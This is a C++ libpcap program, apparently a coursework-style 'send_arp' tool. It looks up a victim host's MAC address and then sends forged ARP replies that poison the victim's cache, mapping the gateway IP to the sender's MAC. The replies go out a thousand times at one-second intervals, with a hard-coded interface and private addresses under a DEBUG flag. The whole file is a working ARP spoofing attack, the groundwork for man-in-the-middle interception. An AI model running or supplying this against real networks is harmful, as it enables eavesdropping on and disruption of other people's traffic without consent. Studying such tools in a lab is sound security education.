#include <iostream>
#include <pcap/pcap.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <unistd.h>

#define DEBUG

using namespace std;

typedef struct {
    u_char dMac[6];
    u_char sMac[6];
    uint16_t ether_type;
} etherHeader;

typedef struct {
    uint16_t hw_type;
    uint16_t protocol;
    uint8_t hw_size;
    uint8_t protocol_size;
    uint16_t opcode;
    u_char sender_mac[6];
    u_char sender_ip[4];
    u_char target_mac[6];
    u_char target_ip[4];
} arpHeader;

typedef struct {
    u_char mac[6];
    u_char vip[4];
    u_char gip[4];
    u_char vmac[6];
} myInfo;

pcap_t *handle;

void usage() {
    cout << "wrong!" << endl << "[format] sudo ./send_arp <devname> <victim ip> <gateway ip>" << endl;
}

u_char* convertIP(const char* ip) {
    u_char* ret = new u_char[4]{0, };
    for (int i = 0; i < strlen(ip); i++){
        if(*(ip+i) == '.'){
            ret++;
        }else{
            *ret *= 10;
            *ret += *(ip+i) - '0';
        }
    }
    return ret - 3;
}

u_char* getMyIP(const char* dev){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    return convertIP(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

u_char* getMyMac(const char* dev){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    u_char* ret = new u_char[6];
    memcpy(ret, ifr.ifr_hwaddr.sa_data, 6);
    return ret;
}

void setMyInfo(const char* dev, const char* vip, const char* gip, myInfo* info){
    memcpy(info->mac, getMyMac(dev), 6);                // set local mac
    memcpy(info->vip, convertIP(vip), 4);               // set vip & gip
    memcpy(info->gip, convertIP(gip), 4);
}

void setARPPacketHeaders(etherHeader* eth, arpHeader* arp, myInfo* info){
    memcpy(eth->dMac, "\xff\xff\xff\xff\xff\xff", 6);       // to broadcast
    memcpy(eth->sMac, info->mac, 6);                        // from me
    eth->ether_type = ntohs(0x0806);                        // arp protocol

    arp->hw_type = ntohs(1);
    arp->protocol = ntohs(0x0800);
    arp->hw_size = 6;
    arp->protocol_size = 4;
    arp->opcode = ntohs(2);
    memcpy(arp->sender_mac, eth->sMac, 6);                      // my mac
    memcpy(arp->sender_ip, info->gip, 4);                       // gateway ip
    memcpy(arp->target_mac, info->vmac, 6);                     // victim mac
    memcpy(arp->target_ip, info->vip, 4);                       // victim ip
}

u_char* makeARPPacket(etherHeader* eth, arpHeader* arp){
    u_char* ret = new u_char[42];
    memcpy(ret, eth, 14);
    memcpy(ret+14, arp, 28);
    return ret;
}

void getVictimMac(const char* dev, myInfo* getInfo){
    etherHeader* eth = new etherHeader;
    arpHeader* arp = new arpHeader;
    myInfo* info = new myInfo;
    memcpy(info->mac, getInfo->mac, 6);
    memcpy(info->gip, getMyIP(dev), 4);
    memcpy(info->vip, getInfo->vip, 4);
    memcpy(info->vmac, "\x00\x00\x00\x00\x00\x00", 6);
    setARPPacketHeaders(eth, arp, info);
    arp->opcode = ntohs(1);                                 // arp request
    cout << "Checking Victim's MAC Address" << endl;
    pcap_sendpacket(handle,makeARPPacket(eth, arp),42);
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        etherHeader* getEth = (etherHeader*)packet;
        if(ntohs(getEth->ether_type) == 0x0806){
            arpHeader* getArp = (arpHeader*)(packet + 14);
            if(!memcmp(getArp->sender_ip, getInfo->vip, 4)){
                memcpy(getInfo->vmac, getArp->sender_mac, 6);
                cout << "Find." << endl;
                delete eth;
                delete arp;
                delete info;
                return;
            }
        }
    }
}

void printInfo(myInfo* info){
    cout << "Victim IP: ";
    for (int i = 0; i < 4; i++) printf("%d.", *(info->vip + i));
    cout << "\b " << endl << "Gateway IP: ";
    for (int i = 0; i < 4; i++) printf("%d.", *(info->gip + i));
    cout << "\b " << endl;
}

int main(int argc, const char** argv) {
#ifndef DEBUG
    if(argc != 4){
        usage();
        return -1;
    }
    const char* dev = argv[1];
    const char* vIP = argv[2];
    const char* gIP = argv[3];
#else
    const char dev[] = "ens33";
    const char vIP[] = "172.20.10.11";
    const char gIP[] = "172.20.10.1";
#endif
    int i = 0;
    myInfo* info = new myInfo;
    etherHeader* eth = new etherHeader;
    arpHeader* arp = new arpHeader;

    setMyInfo(dev, vIP, gIP, info);
    printInfo(info);
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return -2;
    }

    getVictimMac(dev, info);                                            // get victim's mac addr
    cout << "Victim MAC: ";
    for (int i = 0; i < 6; i++) printf("%02x:", *(info->vmac + i));
    cout << "\b " << endl;

    setARPPacketHeaders(eth, arp, info);
    memcpy(eth->dMac, info->vmac, 6);
    u_char* arpPacket = makeARPPacket(eth, arp);
    cout << "Sending ARP packet to victim..." << endl;
    for (int i = 0; i < 1000; i++){
            pcap_sendpacket(handle,arpPacket,42);
            cout << "Send" << endl;
            sleep(1);
    }

    cin >> i;
    return 0;
}
